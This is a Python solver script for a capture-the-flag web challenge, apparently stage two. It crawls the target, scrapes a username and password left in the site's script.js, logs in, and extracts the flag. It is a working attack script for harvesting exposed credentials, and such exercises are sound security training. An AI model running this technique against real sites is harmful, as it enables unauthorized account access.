#!/usr/bin/env python3

import re
import sys
import requests

if len(sys.argv) != 2:
    print("Usage: python3 stage2_solver.py <base_url>")
    sys.exit(1)

base_url = sys.argv[1].rstrip("/")

session = requests.Session()

print("[*] Accessing homepage...")

response = session.get(base_url)
response.raise_for_status()

# Discover the login route from the homepage source
match = re.search(r'/login', response.text)

if not match:
    print("[-] Could not find the login route.")
    sys.exit(1)

login_url = base_url + "/login"

print(f"[+] Login route discovered: {login_url}")
print("[*] Inspecting login page...")

response = session.get(login_url)
response.raise_for_status()

# Discover the JavaScript resource
match = re.search(r'<script[^>]+src=["\']([^"\']*script\.js)["\']', response.text)

if not match:
    print("[-] Could not find script.js.")
    sys.exit(1)

script_url = base_url + match.group(1)

print(f"[+] JavaScript resource discovered: {script_url}")
print("[*] Inspecting script.js...")

response = session.get(script_url)
response.raise_for_status()

javascript = response.text

# Extract exposed credentials
username_match = re.search(r'Username:\s*([A-Za-z0-9_]+)', javascript)
password_match = re.search(r'Password:\s*([A-Za-z0-9_]+)', javascript)

if not username_match or not password_match:
    print("[-] Could not find credentials.")
    sys.exit(1)

username = username_match.group(1)
password = password_match.group(1)

print(f"[+] Username discovered: {username}")
print(f"[+] Password discovered: {password}")

print("[*] Logging in...")

response = session.post(
    login_url,
    data={
        "username": username,
        "password": password
    }
)

response.raise_for_status()

# Extract the CTF flag
flag_match = re.search(r'CTF\{[^}]+\}', response.text)

if not flag_match:
    print("[-] Flag not found.")
    sys.exit(1)

print(f"[+] Flag: {flag_match.group(0)}")
